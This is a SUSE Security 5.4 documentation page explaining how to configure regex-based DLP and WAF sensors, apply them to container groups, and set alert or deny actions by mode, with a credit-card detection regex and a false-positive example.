<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>DLP &amp; WAF Sensors :: Rancher product documentation</title>
    <link rel="canonical" href="https://documentation.suse.com/cloudnative/security/5.4/en/dlp.html">
    <link rel="prev" href="responserules.html">
    <link rel="next" href="threats.html">
    <meta name="generator" content="Antora 3.1.10">
    <link rel="stylesheet" href="../../../_/css/site.css">
<link rel="stylesheet" href="../../../_/css/search.css">
<link rel="icon" href="../../../_/img/favicon.ico" type="image/x-icon">
<link rel="stylesheet" href="../../../_/css/font-styles.css">
<link rel="stylesheet" href="../../../_/fonts/css/all.css">
<link rel="stylesheet" href="../../../_/css/site-extra.css">
<link rel="stylesheet" href="../../../_/css/vendor/tabs.css">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link
href="https://fonts.googleapis.com/css2?family=SUSE:wght@100..800&display=swap" rel="stylesheet">
<link href="https://documentation.suse.com/docserv/res/fonts/poppins/poppins.css" rel="stylesheet">
<!-- <link href="https://fonts.googleapis.com/css?family=Montserrat|Roboto&display=swap" rel="stylesheet"> -->
<link rel="stylesheet" href="../../../_/css/vendor/light.css">
<!-- <script src="/docserv/res/lightheaded/analytics.js"
        type="text/javascript"></script> -->
    <script>var uiRootPath = '../../../_'</script>
  </head>
  <body class="article">
<script type="module">import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.esm.min.mjs'; mermaid.initialize({"startOnLoad":true});</script><header class="header">
  <nav class="navbar">
    <div class="navbar-brand">
      <div class="navbar-item">
        <a class=" navbar-logo" href="https://documentation.suse.com/" aria-label="SUSE Documentation Home"><img class="logo"
            src="../../../_/img/logo.svg" alt="SUSE logo"/></a>
      </div>
      <div class="navbar-item search hide-for-print">
        <div id="search-field" class="field">
          <label class="visual-search-label" for="search-input">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</label>
          <input label="Search" aria-label="Search" id="search-input" type="text" placeholder="Search the docs" >
        </div>
      </div>
      <button class="navbar-burger" data-target="topbar-nav">
        <span></span>
        <span></span>
        <span></span>
      </button>
    </div>
    <div id="topbar-nav" class="navbar-menu">
      <div class="navbar-end">
        <div class="navbar-item has-dropdown is-hoverable">
          <div class="navbar-link">
            <img src="../../../_/img/resources.png" class="langIcon Resurces" alt="Resources" title="Resources">
          </div>
          <div class="navbar-dropdown">
            <a class="navbar-item" href="https://github.com/rancher/neuvector-product-docs"><i class="fab fa-github"></i>&nbsp;SUSE® Security</a>
            <div class="has-submenu">
              <a class="navbar-item" href="#" ><i class="fas fa-file-alt"></i>&nbsp;Report Issue &nbsp;<i class="fas fa-chevron-right"></i></a>
              <div class="submenu">
                <a class="navbar-item" href="https://scc.suse.com">SCC (Recommended)</a>
                <a class="navbar-item" href="https://github.com/rancher/neuvector-product-docs/issues">GitHub Issue</a>
              </div>
            </div>
            <a class="navbar-item" href="https://github.com/rancher/product-docs-playbook/blob/main/CONTRIBUTING.md"><i class="fas fa-user-edit"></i>&nbsp;Contribute</a>
          </div>
        </div>
        <div class="navbar-item has-dropdown is-hoverable">
          <div class="navbar-link"><img src="../../../_/img/language.png" class="langIcon Language" alt="Language"
              title="Language"></div>
          <div class="navbar-dropdown">
            <!--  </div><div>Icons made by <a href="https://www.flaticon.com/authors/freepik" title="Freepik">Freepik</a> from <a href="https://www.flaticon.com/" title="Flaticon">www.flaticon.com</a></div> -->
              <a role="button" class="navbar-item" id="en" onclick="selectLanguage(this.id)">
                <!--<img src="../../../_/img/engFlag.svg" class="langIcon english">-->
                &nbsp;English
              </a>
            <!-- LANGUAGESELECTOR -->
          </div>
        </div>
        <!--
        <div class="navbar-item">
          <a href="https://twitter.com/SUSE">
            <img alt="X-logo" class="x-logo" src="../../../_/img/x-logo-white.png">
          </a>
        </div>
        -->
      </div>
    </div>

    <!--   <div id="topbar-nav" class="navbar-menu">
      <div class="navbar-end">

        </div>
        <div class="navbar-item">
          <span class="control">
          </span>
        </div>
        <div class="navbar-item">
          <span class="control">
          </span>
        </div>
        <div class="navbar-item">
          <span class="control">
          </span>
        </div>
        <div class="navbar-item">
          <span class="control">
          </span>
        </div>
      </div> -->
    </div>
  </nav>
</header>
<div class="body">
<div class="nav-container" data-component="security" data-version="5.4">
  <aside class="nav">
    <div class="panels">
<div class="nav-panel-menu is-active" data-panel="menu">
  <nav class="nav-menu">
    <button class="nav-menu-toggle" aria-label="Toggle expand/collapse all" style="display: none"></button>
    <h3 class="title"><a href="overview.html">SUSE® Security</a></h3>
<ul class="nav-list">
  <li class="nav-item" data-depth="0">
<ul class="nav-list">
  <li class="nav-item" data-depth="1">
    <a class="nav-link" href="overview.html">SUSE® Security Overview</a>
  </li>
  <li class="nav-item" data-depth="1">
    <button class="nav-item-toggle" aria-label="Toggle expand/collapse"></button>
    <span class="nav-text">Understanding SUSE® Security</span>
<ul class="nav-list">
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="requirements.html">System Requirements</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="installation.html">Deployment Preparation</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="policy-overview.html">Security Policy Overview</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="integration.html">Enterprise Integration</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="ci-workflow.html">CI/CD Workflow</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="public-cloud.html">Public Cloud</a>
  </li>
</ul>
  </li>
  <li class="nav-item" data-depth="1">
    <button class="nav-item-toggle" aria-label="Toggle expand/collapse"></button>
    <span class="nav-text">Operational Tasks</span>
<ul class="nav-list">
  <li class="nav-item" data-depth="2">
    <button class="nav-item-toggle" aria-label="Toggle expand/collapse"></button>
    <span class="nav-text">Deploying SUSE® Security</span>
<ul class="nav-list">
  <li class="nav-item" data-depth="3">
    <a class="nav-link" href="configmap.html">Deploy Using ConfigMap</a>
  </li>
  <li class="nav-item" data-depth="3">
    <a class="nav-link" href="operators.html">Deploy Using Operators</a>
  </li>
  <li class="nav-item" data-depth="3">
    <a class="nav-link" href="kubernetes.html">Kubernetes</a>
  </li>
  <li class="nav-item" data-depth="3">
    <a class="nav-link" href="openshift.html">OpenShift</a>
  </li>
  <li class="nav-item" data-depth="3">
    <a class="nav-link" href="rancher.html">Rancher Deployment</a>
  </li>
  <li class="nav-item" data-depth="3">
    <a class="nav-link" href="airgap.html">Air-Gapped Deployment</a>
  </li>
  <li class="nav-item" data-depth="3">
    <a class="nav-link" href="docker.html">Docker</a>
  </li>
  <li class="nav-item" data-depth="3">
    <a class="nav-link" href="updating.html">Updating SUSE® Security</a>
  </li>
  <li class="nav-item" data-depth="3">
    <a class="nav-link" href="testing.html">Evaluating and Testing SUSE® Security</a>
  </li>
  <li class="nav-item" data-depth="3">
    <a class="nav-link" href="troubleshooting.html">Troubleshooting Deployments</a>
  </li>
</ul>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="users.html">Users and Roles</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="restore.html">Restoring SUSE® Security Configuration</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="remove.html">Removing or Resetting SUSE® Security</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="internal.html">Replacing Internal Certificates</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="replacecert.html">Replacing Self-Signed Certificates</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="rest-api.html">Connect to Manager, REST API Server</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="automation.html">Automation with REST API</a>
  </li>
</ul>
  </li>
  <li class="nav-item" data-depth="1">
    <button class="nav-item-toggle" aria-label="Toggle expand/collapse"></button>
    <span class="nav-text">SUSE® Security Interface</span>
<ul class="nav-list">
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="navigation.html">Navigating the Console</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="multicluster.html">Enterprise Multi-Cluster Management</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="modes.html">Modes: Discover, Monitor, Protect</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="reporting.html">Reporting &amp; Notifications</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="customui.html">Customizing the UI</a>
  </li>
</ul>
  </li>
  <li class="nav-item" data-depth="1">
    <button class="nav-item-toggle" aria-label="Toggle expand/collapse"></button>
    <span class="nav-text">Security Management</span>
<ul class="nav-list">
  <li class="nav-item" data-depth="2">
    <button class="nav-item-toggle" aria-label="Toggle expand/collapse"></button>
    <span class="nav-text">Security Policy</span>
<ul class="nav-list">
  <li class="nav-item" data-depth="3">
    <button class="nav-item-toggle" aria-label="Toggle expand/collapse"></button>
    <span class="nav-text">Admission Controls</span>
<ul class="nav-list">
  <li class="nav-item" data-depth="4">
    <a class="nav-link" href="admission.html">Admission Controls</a>
  </li>
  <li class="nav-item" data-depth="4">
    <a class="nav-link" href="sigstore.html">Sigstore Cosign Signature Verifiers</a>
  </li>
  <li class="nav-item" data-depth="4">
    <a class="nav-link" href="assessment.html">Configuration Assessment for Kubernetes Resources</a>
  </li>
</ul>
  </li>
  <li class="nav-item" data-depth="3">
    <a class="nav-link" href="groups.html">Groups</a>
  </li>
  <li class="nav-item" data-depth="3">
    <a class="nav-link" href="networkrules.html">Network Rules</a>
  </li>
  <li class="nav-item" data-depth="3">
    <a class="nav-link" href="processrules.html">Process Profile Rules</a>
  </li>
  <li class="nav-item" data-depth="3">
    <a class="nav-link" href="filerules.html">File Access Rules</a>
  </li>
  <li class="nav-item" data-depth="3">
    <a class="nav-link" href="responserules.html">Response Rules</a>
  </li>
  <li class="nav-item is-current-page" data-depth="3">
    <a class="nav-link" href="dlp.html">DLP &amp; WAF Sensors</a>
  </li>
  <li class="nav-item" data-depth="3">
    <a class="nav-link" href="threats.html">Network Threat Signatures</a>
  </li>
  <li class="nav-item" data-depth="3">
    <a class="nav-link" href="customcompliance.html">Custom Compliance Checks</a>
  </li>
  <li class="nav-item" data-depth="3">
    <a class="nav-link" href="federated.html">Federated Policy</a>
  </li>
  <li class="nav-item" data-depth="3">
    <button class="nav-item-toggle" aria-label="Toggle expand/collapse"></button>
    <span class="nav-text">Custom Resource Definitions</span>
<ul class="nav-list">
  <li class="nav-item" data-depth="4">
    <a class="nav-link" href="usingcrd.html">Using CRD</a>
  </li>
  <li class="nav-item" data-depth="4">
    <a class="nav-link" href="import.html">Importing CRD from Console</a>
  </li>
</ul>
  </li>
</ul>
  </li>
  <li class="nav-item" data-depth="2">
    <button class="nav-item-toggle" aria-label="Toggle expand/collapse"></button>
    <span class="nav-text">Security Risks, Scanning &amp; Compliance</span>
<ul class="nav-list">
  <li class="nav-item" data-depth="3">
    <button class="nav-item-toggle" aria-label="Toggle expand/collapse"></button>
    <span class="nav-text">Scanning &amp; Compliance</span>
<ul class="nav-list">
  <li class="nav-item" data-depth="4">
    <a class="nav-link" href="scanning.html">Scanning</a>
  </li>
  <li class="nav-item" data-depth="4">
    <a class="nav-link" href="vulnerabilities.html">Vulnerability Management</a>
  </li>
  <li class="nav-item" data-depth="4">
    <a class="nav-link" href="compliance.html">Compliance &amp; CIS Benchmarks</a>
  </li>
</ul>
  </li>
  <li class="nav-item" data-depth="3">
    <button class="nav-item-toggle" aria-label="Toggle expand/collapse"></button>
    <span class="nav-text">Registry Scanning</span>
<ul class="nav-list">
  <li class="nav-item" data-depth="4">
    <a class="nav-link" href="registry-scanning-configuration.html">Registry Scanning Configuration</a>
  </li>
  <li class="nav-item" data-depth="4">
    <a class="nav-link" href="harbor.html">Harbor Pluggable Scanner Module</a>
  </li>
  <li class="nav-item" data-depth="4">
    <a class="nav-link" href="ecr-iam.html">ECR Scanning Using IAM Roles</a>
  </li>
  <li class="nav-item" data-depth="4">
    <a class="nav-link" href="gcr-sa.html">GCR Scanning Using Service Accounts</a>
  </li>
</ul>
  </li>
  <li class="nav-item" data-depth="3">
    <button class="nav-item-toggle" aria-label="Toggle expand/collapse"></button>
    <span class="nav-text">Build Phase Image Scanning</span>
<ul class="nav-list">
  <li class="nav-item" data-depth="4">
    <a class="nav-link" href="build-image-scanning.html">Local</a>
  </li>
  <li class="nav-item" data-depth="4">
    <a class="nav-link" href="jenkins.html">Jenkins</a>
  </li>
  <li class="nav-item" data-depth="4">
    <a class="nav-link" href="bamboo.html">Bamboo</a>
  </li>
  <li class="nav-item" data-depth="4">
    <a class="nav-link" href="circleci.html">CircleCI</a>
  </li>
  <li class="nav-item" data-depth="4">
    <a class="nav-link" href="azuredevops.html">Azure DevOps</a>
  </li>
  <li class="nav-item" data-depth="4">
    <a class="nav-link" href="gitlab.html">Gitlab</a>
  </li>
  <li class="nav-item" data-depth="4">
    <a class="nav-link" href="github.html">GitHub</a>
  </li>
</ul>
  </li>
  <li class="nav-item" data-depth="3">
    <a class="nav-link" href="improve-score.html">Improve Security Risk Score</a>
  </li>
  <li class="nav-item" data-depth="3">
    <a class="nav-link" href="cve-sources.html">CVE Database Sources &amp; Version</a>
  </li>
  <li class="nav-item" data-depth="3">
    <a class="nav-link" href="updating-cve-database.html">Updating the CVE Database</a>
  </li>
  <li class="nav-item" data-depth="3">
    <a class="nav-link" href="scanners.html">Parallel &amp; Stand-Alone Scanners</a>
  </li>
</ul>
  </li>
</ul>
  </li>
  <li class="nav-item" data-depth="1">
    <button class="nav-item-toggle" aria-label="Toggle expand/collapse"></button>
    <span class="nav-text">Enterprise Features</span>
<ul class="nav-list">
  <li class="nav-item" data-depth="2">
    <button class="nav-item-toggle" aria-label="Toggle expand/collapse"></button>
    <span class="nav-text">Integration</span>
<ul class="nav-list">
  <li class="nav-item" data-depth="3">
    <a class="nav-link" href="ldap.html">LDAP</a>
  </li>
  <li class="nav-item" data-depth="3">
    <a class="nav-link" href="msad.html">Microsoft AD</a>
  </li>
  <li class="nav-item" data-depth="3">
    <a class="nav-link" href="saml.html">SAML (Okta)</a>
  </li>
  <li class="nav-item" data-depth="3">
    <a class="nav-link" href="msazure.html">SAML (Azure AD)</a>
  </li>
  <li class="nav-item" data-depth="3">
    <a class="nav-link" href="adfs.html">SAML (ADFS)</a>
  </li>
  <li class="nav-item" data-depth="3">
    <a class="nav-link" href="openid.html">OpenID Connect Azure/Okta</a>
  </li>
  <li class="nav-item" data-depth="3">
    <a class="nav-link" href="oidc-adfs.html">OpenID Connect (OIDC) for ADFS</a>
  </li>
  <li class="nav-item" data-depth="3">
    <a class="nav-link" href="ibmsa.html">IBM Security Advisor</a>
  </li>
  <li class="nav-item" data-depth="3">
    <a class="nav-link" href="ibmqr.html">IBM QRadar</a>
  </li>
  <li class="nav-item" data-depth="3">
    <a class="nav-link" href="splunk.html">Splunk</a>
  </li>
</ul>
  </li>
</ul>
  </li>
  <li class="nav-item" data-depth="1">
    <button class="nav-item-toggle" aria-label="Toggle expand/collapse"></button>
    <span class="nav-text">References</span>
<ul class="nav-list">
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="details.html">Environment Variables Details</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="cli.html">Command Line</a>
  </li>
</ul>
  </li>
  <li class="nav-item" data-depth="1">
    <button class="nav-item-toggle" aria-label="Toggle expand/collapse"></button>
    <span class="nav-text">Release Notes</span>
<ul class="nav-list">
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="5x.html">5.x Release Notes</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="4x.html">4.x Release Notes</a>
  </li>
  <li class="nav-item" data-depth="2">
    <a class="nav-link" href="other.html">Integrations &amp; Other Components</a>
  </li>
</ul>
  </li>
</ul>
  </li>
</ul>
  </nav>
</div>
<div class="nav-panel-explore" data-panel="explore">
  <div class="context">
    <span class="title">SUSE® Security</span>
    <span class="version">5.4</span>
  </div>
  <ul class="components">
        <li class="component">
          <div class="title"><a href="../../../cluster-api/v0.16/en/index.html">Cluster API</a></div>
          <ul class="versions">
            <li class="version is-latest">
              <a href="../../../cluster-api/v0.16/en/index.html">0.16</a>
            </li>
            <li class="version">
              <a href="../../../cluster-api/v0.15/en/index.html">0.15</a>
            </li>
            <li class="version">
              <a href="../../../cluster-api/v0.14/en/index.html">0.14</a>
            </li>
            <li class="version">
              <a href="../../../cluster-api/v0.13/en/index.html">0.13</a>
            </li>
            <li class="version">
              <a href="../../../cluster-api/v0.12/en/index.html">0.12</a>
            </li>
            <li class="version">
              <a href="../../../cluster-api/v0.11/en/index.html">0.11</a>
            </li>
          </ul>
        </li>
        <li class="component">
          <div class="title"><a href="../../../continuous-delivery/v0.11/en/index.html">Continuous Delivery</a></div>
          <ul class="versions">
            <li class="version is-latest">
              <a href="../../../continuous-delivery/v0.11/en/index.html">0.11</a>
            </li>
            <li class="version">
              <a href="../../../continuous-delivery/v0.10/en/index.html">0.10</a>
            </li>
            <li class="version">
              <a href="../../../continuous-delivery/v0.9/en/index.html">0.9</a>
            </li>
          </ul>
        </li>
        <li class="component">
          <div class="title"><a href="../../../k3s/latest/en/introduction.html">K3s</a></div>
          <ul class="versions">
            <li class="version is-latest">
              <a href="../../../k3s/latest/en/introduction.html">Latest</a>
            </li>
          </ul>
        </li>
        <li class="component">
          <div class="title"><a href="../../../os-manager/1.6/en/index.html">OS Manager</a></div>
          <ul class="versions">
            <li class="version is-latest">
              <a href="../../../os-manager/1.6/en/index.html">1.6</a>
            </li>
            <li class="version">
              <a href="../../../os-manager/1.5/en/index.html">1.5</a>
            </li>
          </ul>
        </li>
        <li class="component">
          <div class="title"><a href="../../../policy-manager/1.22/en/introduction.html">Policy Manager</a></div>
          <ul class="versions">
            <li class="version is-latest">
              <a href="../../../policy-manager/1.22/en/introduction.html">1.22-next</a>
            </li>
            <li class="version">
              <a href="../../../policy-manager/1.21/en/introduction.html">1.21</a>
            </li>
            <li class="version">
              <a href="../../../policy-manager/1.20/en/introduction.html">1.20</a>
            </li>
            <li class="version">
              <a href="../../../policy-manager/1.19/en/introduction.html">1.19</a>
            </li>
            <li class="version">
              <a href="../../../policy-manager/1.18/en/introduction.html">1.18</a>
            </li>
            <li class="version">
              <a href="../../../policy-manager/1.17/en/introduction.html">1.17</a>
            </li>
            <li class="version">
              <a href="../../../policy-manager/1.16/en/introduction.html">1.16</a>
            </li>
          </ul>
        </li>
        <li class="component">
          <div class="title"><a href="../../../rke2/latest/en/introduction.html">RKE2</a></div>
          <ul class="versions">
            <li class="version is-latest">
              <a href="../../../rke2/latest/en/introduction.html">Latest</a>
            </li>
          </ul>
        </li>
        <li class="component">
          <div class="title"><a href="../../../rancher-manager/latest/en/about-rancher/what-is-rancher.html">SUSE® Rancher Manager</a></div>
          <ul class="versions">
            <li class="version is-latest">
              <a href="../../../rancher-manager/latest/en/about-rancher/what-is-rancher.html">Latest</a>
            </li>
            <li class="version">
              <a href="../../../rancher-manager/v2.10/en/about-rancher/what-is-rancher.html">v2.10</a>
            </li>
            <li class="version">
              <a href="../../../rancher-manager/v2.9/en/about-rancher/what-is-rancher.html">v2.9</a>
            </li>
            <li class="version">
              <a href="../../../rancher-manager/v2.8/en/about-rancher/what-is-rancher.html">v2.8</a>
            </li>
          </ul>
        </li>
        <li class="component is-current">
          <div class="title"><a href="overview.html">SUSE® Security</a></div>
          <ul class="versions">
            <li class="version is-current is-latest">
              <a href="overview.html">5.4</a>
            </li>
            <li class="version">
              <a href="../../5.3/en/overview.html">5.3</a>
            </li>
          </ul>
        </li>
        <li class="component">
          <div class="title"><a href="../../../storage/1.9.0/en/longhorn-documentation.html">SUSE® Storage</a></div>
          <ul class="versions">
            <li class="version is-latest">
              <a href="../../../storage/1.9.0/en/longhorn-documentation.html">1.9.0 (Dev)</a>
            </li>
            <li class="version">
              <a href="../../../storage/1.8.0/en/longhorn-documentation.html">1.8.0 (Latest)</a>
            </li>
            <li class="version">
              <a href="../../../storage/1.7.0/en/longhorn-documentation.html">1.7.0</a>
            </li>
          </ul>
        </li>
        <li class="component">
          <div class="title"><a href="../../../virtualization/v1.5/en/introduction/overview.html">SUSE® Virtualization</a></div>
          <ul class="versions">
            <li class="version is-latest">
              <a href="../../../virtualization/v1.5/en/introduction/overview.html">v1.5 (Dev)</a>
            </li>
            <li class="version">
              <a href="../../../virtualization/v1.4/en/introduction/overview.html">v1.4 (Latest)</a>
            </li>
            <li class="version">
              <a href="../../../virtualization/v1.3/en/introduction/overview.html">v1.3</a>
            </li>
          </ul>
        </li>
  </ul>
</div>
    </div>
  </aside>
</div>
<main class="article">
<div class="toolbar" role="navigation">
<button class="nav-toggle"></button>
  <a href="../../../rancher-manager/latest/en/about-rancher/what-is-rancher.html" aria-label="Home" class="home-link"></a>
<nav class="breadcrumbs" aria-label="breadcrumbs">
  <ul>
    <li><a href="overview.html">SUSE® Security</a></li>
    <li>Security Management</li>
    <li>Security Policy</li>
    <li><a href="dlp.html">DLP &amp; WAF Sensors</a></li>
  </ul>
</nav>
<div class="page-versions">
  <button class="version-menu-toggle" title="Show other versions of page">5.4</button>
  <div class="version-menu">
    <a class="version is-current" href="dlp.html">5.4</a>
    <a class="version" href="../../5.3/en/dlp.html">5.3</a>
  </div>
</div>
  <div class="edit-this-page"><a href="https://github.com/rancher/neuvector-product-docs/edit/main/docs/5.4/modules/en/pages/dlp.adoc">Edit this Page</a></div>
  </div>
  <div class="content">
<aside class="toc sidebar" data-title="On this page" data-levels="2">
  <div class="toc-menu"></div>
</aside>
<article class="doc">
<h1 class="page">DLP &amp; WAF Sensors</h1>
<div class="sect1">
<h2 id="_data_loss_prevention_dlp_and_web_application_firewall_waf"><a class="anchor" href="#_data_loss_prevention_dlp_and_web_application_firewall_waf"></a>Data Loss Prevention (DLP) and Web Application Firewall (WAF)</h2>
<div class="sectionbody">
<div class="paragraph">
<p>DLP and WAF uses the Deep Packet Inspection (DPI) of SUSE® Security to inspect the network payloads of connections for sensitive data violations. SUSE® Security uses a regular expression (regex) based engine to perform packet filtering functions. Extreme care should be taken when applying sensors to container traffic, as the filtering function incurs additional system overhead and can impact performance of the host.</p>
</div>
<div class="paragraph">
<p>DLP and WAF filtering are applied differently depending on the group(s) to which they are applied. In general, WAF filtering is applied to inbound and outbound connections except for internal traffic where only inbound filtering is applied. DLP filtering applies to inbound and outbound connections from a 'security domain', but not any internal connections within a security domain. See the detailed descriptions below.</p>
</div>
<div class="paragraph">
<p>Configuring DLP or WAF is a two step process:</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Define and test the sensor(s), which is the set of regular expressions used to match the header, URL, or entire packet.</p>
</li>
<li>
<p>Apply the desired sensor to a Group, in the Policy &#8594; Groups screen.</p>
</li>
</ol>
</div>
<div class="sect2">
<h3 id="_waf_sensors"><a class="anchor" href="#_waf_sensors"></a>WAF Sensors</h3>
<div class="paragraph">
<p>WAF sensors represent inspection of network traffic to/from a pod/container. These sensors can be applied to any applicable group, even custom groups (e.g. namespace groups). Incoming traffic to ALL containers within the group will be inspected for WAF rule detection. In addition, any outbound (egress) connections external to the cluster will be inspected.</p>
</div>
<div class="paragraph">
<p>This means that, while this feature is named WAF, it is useful and applicable to any network traffic, not only web application traffic, and therefore provides broader protections than simple WAFs. For example, API security can be enforced on outbound connections to an external api service, allowing only GET requests and blocking POSTs.</p>
</div>
<div class="paragraph">
<p>Also note that, while similar to DLP, the inspection is for incoming traffic to EVERY pod/container within the group, while DLP applies inspection to incoming and outgoing traffic from the group only (i.e. the security boundary), not internal traffic in the group (e.g. not east-west within a Group&#8217;s containers).</p>
</div>
<div class="paragraph">
<p><span class="image"><img src="_images/waf_sensors.png" alt="waf"></span></p>
</div>
</div>
<div class="sect2">
<h3 id="_dlp_sensors"><a class="anchor" href="#_dlp_sensors"></a>DLP Sensors</h3>
<div class="paragraph">
<p>DLP Sensors are the patterns that are used to inspect traffic. Built in sensors such as credit card and U.S. social security have predefined regular expressions. You can add custom sensors by defining regex patterns to be used in that sensor. Note that, while similar to WAF, DLP applies inspection to incoming and outgoing traffic from the group only (i.e. the security boundary), not internal traffic in the group (e.g. not east-west within a Group&#8217;s containers). WAF inspection is for incoming traffic only to EVERY pod/container within the group.</p>
</div>
<div class="paragraph">
<p><span class="image"><img src="_images/sensors.png" alt="dlp"></span></p>
</div>
</div>
<div class="sect2">
<h3 id="_configuring_dlp_and_waf_sensors"><a class="anchor" href="#_configuring_dlp_and_waf_sensors"></a>Configuring DLP and WAF sensors</h3>
<div class="paragraph">
<p>The configuration of DLP and WAF sensors is similar. Create a sensor Name and any comment, then select the sensor to Add or Edit the rules for that sensor. Key fields include:</p>
</div>
<div class="ulist">
<ul>
<li>
<p>Have/Not Have. Determines if the match requires the pattern to be found (Have) in order to take the action (e.g. Deny), or only if the pattern does not exist (Not Have) should the action be taken. It is recommended that the "Not Have" operator be combined in the rule with a pattern using the "Have" operator because a single pattern with "Not Have" operator will not be effective.</p>
</li>
<li>
<p>Pattern. This is the regular expression used to determine a match. You can test your regex against sample data to ensure correct Have/Not Have results.</p>
</li>
<li>
<p>Context. Where to look for the pattern match. Choose packet for the broadest inspection of the entire network connection, or narrow the inspection to the URL, header, or body only.</p>
</li>
</ul>
</div>
<div class="paragraph">
<p><span class="image"><img src="_images/5_sensor_config.png" alt="waf"></span></p>
</div>
<div class="paragraph">
<p>Each DLP/WAF rule supports multiple patterns (max 16 patterns are allowed per rule). Multiple patterns as well as setting the rule context can also help reduce false positives.</p>
</div>
<div class="paragraph">
<p>Example of a DLP rule with a Have/Not Have pattern:
Have:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlightjs highlight"><code class="language-shell hljs" data-lang="shell">\b3[47]\d{2}([ -]?)(?!(\d)\2{5}|123456|234567|345678)\d{6}\1(?!(\d)\3{4}|12345|56789)\d{5}\b</code></pre>
</div>
</div>
<div class="paragraph">
<p>This produces a false positive match for "istio_agent_go_gc_duration_seconds_sum 22.378386247999998":</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlightjs highlight"><code class="language-shell hljs" data-lang="shell">docker exec -ti httpclient sh
/ # curl -d "{\"context\": \"istio_agent_go_gc_duration_seconds_sum 22.378386247999998\"}" 172.17.0.5:8080/
Hello, world!</code></pre>
</div>
</div>
<div class="paragraph">
<p>Adding a Not Have pattern removes the false positive:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlightjs highlight"><code class="language-shell hljs" data-lang="shell">istio\_(\w){5}</code></pre>
</div>
</div>
<div class="paragraph">
<p><strong><em>Sensors must be applied to a Group to become effective.</em></strong></p>
</div>
</div>
<div class="sect2">
<h3 id="_applying_dlpwaf_sensors_to_container_groups"><a class="anchor" href="#_applying_dlpwaf_sensors_to_container_groups"></a>Applying DLP/WAF Sensors to Container Groups</h3>
<div class="paragraph">
<p>To activate a DLP or WAF sensor, go to Policy &#8594; Groups to select the group desired. Enable DLP/WAF for the Group and add the sensor(s).</p>
</div>
<div class="paragraph">
<p>It is recommended that DLP sensors be applied to the boundary of a security zone, defined by a Group, to minimize the impact of DLP inspection. If needed, define a Custom Group that represents such a security zone.  For example, if the Group selected is the reserved group 'containers', and DLP sensors added to the group, only traffic in or out of the cluster and not between all containers will be inspected. Or if it is a custom group defined as 'namespace=demo' then only traffic in or out of the namespace demo will be inspected, and not any inter-container traffic within the namespace.</p>
</div>
<div class="paragraph">
<p>It is recommended that WAF sensors be applied only to Groups where incoming (e.g. ingress) connections are expected, unless the sensor(s) apply to specific internal applications (expecting east-west traffic).</p>
</div>
<div class="paragraph">
<p><span class="image"><img src="_images/apply_dlp_group.png" alt="group"></span></p>
</div>
<div class="sect3">
<h4 id="_dlpwaf_behavior_summary"><a class="anchor" href="#_dlpwaf_behavior_summary"></a>DLP/WAF Behavior Summary</h4>
<div class="ulist">
<ul>
<li>
<p>DLP pattern matching does not occur for the traffic which is passing among workloads that belong to same DLP group.</p>
</li>
<li>
<p>Any traffic passing in and out of a DLP group is scanned for pattern matches.</p>
</li>
<li>
<p>Cluster ingress and egress traffic is scanned for patterns if the workload is allowed to make ingress/egress connections.</p>
</li>
<li>
<p>Multiple patterns per DLP/WAF rule (max 16 patterns are allowed per rule).</p>
</li>
<li>
<p>Multiple alerts are generated for a single packet if it matches multiple rules.</p>
</li>
<li>
<p>For performance reasons, only the first 16 rules are alerted and matched even if the packet matches more than 16 rules.</p>
</li>
<li>
<p>Alerts are aggregated and reported together if same rule matches and alerts multiple times within 2 seconds.</p>
</li>
<li>
<p>PCRE is used for pattern matching.</p>
</li>
<li>
<p>Hyper scan library is used for efficient, scalable and high-performance pattern matching.</p>
</li>
</ul>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_dlpwaf_actions_in_discover_monitor_protect_modes"><a class="anchor" href="#_dlpwaf_actions_in_discover_monitor_protect_modes"></a>DLP/WAF Actions in Discover, Monitor, Protect Modes</h3>
<div class="paragraph">
<p>When adding sensors to groups, the DLP/WAF action can be set to Alert or Deny, with the following behavior if there is a match:</p>
</div>
<div class="ulist">
<ul>
<li>
<p>Discover mode. The action will always be to alert, regardless of the setting Alert/Deny.</p>
</li>
<li>
<p>Monitor mode. The action will always be to alert, regardless of the setting Alert/Deny.</p>
</li>
<li>
<p>Protect mode. The action will be to alert if set to Alert, or block if set to Deny.</p>
</li>
</ul>
</div>
</div>
<div class="sect2">
<h3 id="_log4j_detection_waf_pattern"><a class="anchor" href="#_log4j_detection_waf_pattern"></a>Log4j Detection WAF Pattern</h3>
<div class="paragraph">
